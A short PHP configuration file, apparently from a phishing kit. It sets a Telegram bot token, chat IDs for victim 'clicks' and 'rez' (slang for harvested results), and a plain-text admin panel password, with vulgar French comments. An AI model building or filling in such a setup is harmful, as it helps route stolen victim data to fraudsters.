<?php

/*
 *   ███████╗███████╗████████╗ █████╗
 *   ██╔════╝██╔════╝╚══██╔══╝██╔══██╗
 *   █████╗  ███████╗   ██║   ███████║
 *   ██╔══╝  ╚════██║   ██║   ██╔══██║
 *   ███████╗███████║   ██║   ██║  ██║
 *   ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝
 */

declare(strict_types=1);

return [
    // token de ton bot de merde
    'bot_token' => '',

    // chat id du groupe pour les clics fils de pute
    'chat_id_clicks' => '-5205420742',

    // chat id pour ta rez si tu rez
    'chat_id_rez' => '-1003758625738',

    // mot de passe du panel admin qui est super beau
    'panel_password' => 'ntm_charo_101214',

    'enabled' => true,
];
